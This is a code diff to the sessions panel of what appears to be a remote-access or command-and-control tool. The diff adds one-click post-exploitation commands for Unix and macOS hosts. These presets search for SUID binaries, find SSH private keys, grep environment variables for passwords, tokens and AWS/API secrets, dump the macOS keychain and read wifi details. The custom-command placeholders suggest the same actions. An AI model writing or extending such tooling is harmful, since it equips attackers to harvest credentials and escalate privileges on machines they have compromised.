@@ -45,14 +45,30 @@ const QUICK_WIN  = [
 const QUICK_UNIX = [
   { label: 'id',          cmd: 'id' },
   { label: 'hostname',    cmd: 'hostname' },
-  { label: 'ip addr',     cmd: 'ip addr show' },
+  { label: 'ip addr',     cmd: 'ip addr show 2>/dev/null || ifconfig' },
   { label: 'ps aux',      cmd: 'ps aux' },
-  { label: 'ss -tulpn',   cmd: 'ss -tulpn' },
+  { label: 'ss -tulpn',   cmd: 'ss -tulpn 2>/dev/null || netstat -tulpn' },
   { label: 'uname -a',    cmd: 'uname -a' },
   { label: '/etc/passwd', cmd: 'cat /etc/passwd' },
-  { label: 'sudo -l',     cmd: 'sudo -l' },
-  { label: 'crontab -l',  cmd: 'crontab -l' },
-  { label: 'env',         cmd: 'env' },
+  { label: 'sudo -l',     cmd: 'sudo -l 2>&1' },
+  { label: 'crontab -l',  cmd: 'crontab -l 2>/dev/null' },
+  { label: 'SUID files',  cmd: 'find / -perm -4000 -type f 2>/dev/null | head -20' },
+  { label: 'ssh keys',    cmd: 'find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null | head -5' },
+  { label: 'env',         cmd: 'env | grep -iE "pass|token|key|secret|aws|api" 2>/dev/null || env' },
+]
+const QUICK_MAC = [
+  { label: 'id',          cmd: 'id' },
+  { label: 'hostname',    cmd: 'hostname' },
+  { label: 'ifconfig',    cmd: 'ifconfig' },
+  { label: 'ps aux',      cmd: 'ps aux' },
+  { label: 'netstat',     cmd: 'netstat -tulpn 2>/dev/null || lsof -i -nP | head -30' },
+  { label: 'uname -a',    cmd: 'uname -a' },
+  { label: 'users',       cmd: 'cat /etc/passwd | grep -v nologin' },
+  { label: 'sudo -l',     cmd: 'sudo -l 2>&1' },
+  { label: 'launchd',     cmd: 'launchctl list | head -20' },
+  { label: 'keychain',    cmd: 'security dump-keychain 2>/dev/null | head -40 || echo no-access' },
+  { label: 'wifi pwd',    cmd: '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I 2>/dev/null' },
+  { label: 'env',         cmd: 'env | grep -iE "pass|token|key|secret|aws|api" 2>/dev/null || env' },
 ]
 const QUICK_ANDROID = [
   { label: 'id',            cmd: 'id' },
@@ -214,7 +230,8 @@ export default function Sessions({ onOpenTerminal }: Props) {
             const osLow  = s.os?.toLowerCase() ?? ''
             const isWin     = osLow.includes('windows')
             const isAndroid = osLow.includes('android')
-            const quick  = isWin ? QUICK_WIN : isAndroid ? QUICK_ANDROID : QUICK_UNIX
+            const isMac     = osLow.includes('macos') || osLow.includes('darwin')
+            const quick  = isWin ? QUICK_WIN : isAndroid ? QUICK_ANDROID : isMac ? QUICK_MAC : QUICK_UNIX
             const isExp = expanded === s.id
             const myRes = execResults[s.id] ?? []
             const isExec = executing === s.id
@@ -483,7 +500,7 @@ export default function Sessions({ onOpenTerminal }: Props) {
                       <input value={customCmd[s.id] ?? ''} disabled={isExec}
                         onChange={e => setCustomCmd(p => ({ ...p, [s.id]: e.target.value }))}
                         onKeyDown={e => { if (e.key === 'Enter' && customCmd[s.id]?.trim()) { execute(s, customCmd[s.id]); setCustomCmd(p => ({ ...p, [s.id]: '' })) } }}
-                        placeholder={isWin ? 'cmd.exe /c <cmd>' : isAndroid ? 'ls /sdcard  or  id  or  uname -a' : '/bin/bash -c <cmd>'}
+                        placeholder={isWin ? 'whoami  or  ipconfig /all  or  any cmd' : isAndroid ? 'ls /sdcard  or  id  or  uname -a' : isMac ? 'id  or  ifconfig  or  security dump-keychain' : 'id  or  cat /etc/passwd  or  find / -perm -4000'}
                         className="flex-1 bg-bg border border-border rounded px-3 py-2 text-xs font-mono text-text placeholder-muted focus:border-warn outline-none" />
                       <button onClick={() => { if (customCmd[s.id]?.trim()) { execute(s, customCmd[s.id]); setCustomCmd(p => ({ ...p, [s.id]: '' })) } }}
                         disabled={isExec || !customCmd[s.id]?.trim()}
